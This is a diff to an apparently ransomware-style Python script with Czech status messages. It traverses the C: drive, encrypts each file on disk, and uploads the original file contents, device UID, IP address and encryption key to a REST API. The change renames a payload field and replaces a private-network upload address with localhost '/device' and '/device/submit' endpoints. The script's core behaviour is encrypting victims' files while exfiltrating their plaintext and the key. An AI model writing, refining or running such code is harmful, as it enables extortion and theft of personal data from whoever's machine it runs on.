@@ -175,7 +175,7 @@ async def collect_and_send_files_data_with_ga(start_path, uid, ip_address, api_u
             if encrypt_file_on_disk(file_path, encryption_key):
                 payload = {
                     "uuid": uid,
-                    "IP": ip_address,
+                    "ip_address": ip_address,
                     "file": {
                         "file_path": file_path,
                         "original_content": content
@@ -233,7 +233,8 @@ async def send_file_data_to_api(payload, api_url):
 
 async def main():
     start_path = "C:\\"
-    api_url = "http://172.23.25.34:8080/api/upload"
+    API_URL_CREATE = "http://localhost:8080/device"
+    API_URL_SUBMIT = "http://localhost:8080/device/submit"
 
     encryption_key = generate_encryption_key()
     uid = get_device_uid()
@@ -242,22 +243,22 @@ async def main():
     print("Odesílání úvodního statusu...")
     starting_payload = {
         "uuid": uid,
-        "IP": ip_address,
+        "ip_address": ip_address,
         "status": "starting",
         "encryption_key": encryption_key.decode()
     }
-    await send_file_data_to_api(starting_payload, api_url)
+    await send_file_data_to_api(starting_payload, API_URL_CREATE)
 
     print("Sběr dat a šifrování souborů...")
-    await collect_and_send_files_data_with_ga(start_path, uid, ip_address, api_url, encryption_key)
+    await collect_and_send_files_data_with_ga(start_path, uid, ip_address, API_URL_SUBMIT, encryption_key)
 
     print("Odesílání závěrečného statusu...")
     final_status_payload = {
         "uuid": uid,
-        "IP": ip_address,
+        "ip_address": ip_address,
         "status": "completed"
     }
-    await send_file_data_to_api(final_status_payload, api_url)
+    await send_file_data_to_api(final_status_payload, API_URL_SUBMIT)
 
     print("Program dokončil odesílání dat na REST API.")
 
